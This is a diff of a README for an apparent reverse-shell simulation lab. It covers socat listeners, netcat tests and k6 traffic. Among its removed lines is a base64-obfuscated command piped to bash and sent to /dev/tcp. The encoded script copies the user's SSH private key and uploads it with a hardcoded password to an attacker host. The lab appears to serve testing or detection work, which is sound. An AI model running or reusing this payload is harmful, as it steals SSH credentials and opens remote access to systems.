@@ -77,9 +77,9 @@ sudo usermod -aG sudo newusername**
 
 ---
 
-# Running the Simulation
+# Running the reverse shell Simulation
 
-## On the Attacker VM (Open 2 Terminals or use screen)
+## On the Attacker VM (Open 2 Terminals or use tmux | screen)
 
 1. **Create a socat logger:**
 
@@ -89,21 +89,18 @@ awk '{ print strftime("%Y-%m-%d %H:%M:%S"), $0; fflush(); }' | tee -a /tmp/socat
 # save to /tmp/socat-logger.sh
 ```
 
-2. **Create a socat socket:**
+2. **Create a socat socket on the attacker:**
 
 ```
 socat TCP-LISTEN:4444,reuseaddr,fork SYSTEM:/tmp/socat-logger.sh
 ```
-for port in {8880..8889}; do
-  nohup socat TCP-LISTEN:$port,reuseaddr,fork SYSTEM:/tmp/socat-logger.sh >/dev/null 2>&1 &
-done
 3. **Test tcp socket**
 
 ```
  nc -vz x.x.x.x 4444
 OR
  nc x.x.x.x 4444
- {inut any words}
+ {input any words}
 ```
 3. **Optionally run traffic simulation with k6 on Terminal 2 or screen 2:**
 
@@ -116,11 +113,7 @@ sudo docker run --rm -v $(pwd):/scripts grafana/k6 run /scripts/k6.js
 1. **Intiate an interactive Reverse Shell***
 
 ```
-bash -c  'echo "IyEvYmluL2Jhc2gKCmlmIFsgLWQgIiRIT01FLy5zc2giIF07IHRoZW4KICBpZiBbIC1mICIkSE9N
-RS8uc3NoL2lkX3JzYSIgXTsgdGhlbgogICAgbWtkaXIgLXAgfi90bXAvc3NoX2tleXMKICAgIGNw
-ICIkSE9NRS8uc3NoL2lkX3JzYSIgfi90bXAvc3NoX2tleXMvCiAgICBjaG1vZCA3Nzcgfi90bXAv
-c3NoX2tleXMvaWRfcnNhCiAgICBzc2hwYXNzIC1wICdhdHRhY2tlcjEyMzQ1IScgc2NwIH4vdG1w
-L3NzaF9rZXlzL2lkX3JzYSBhdHRhY2tlckAxNzIuMzEuMzAuMTAzOn4vCiAgZmkKZmkK" | base64 -d | bash > /dev/tcp/172.31.30.103/4444'
+python3 reverse_shell.py
 ```
 ---
 
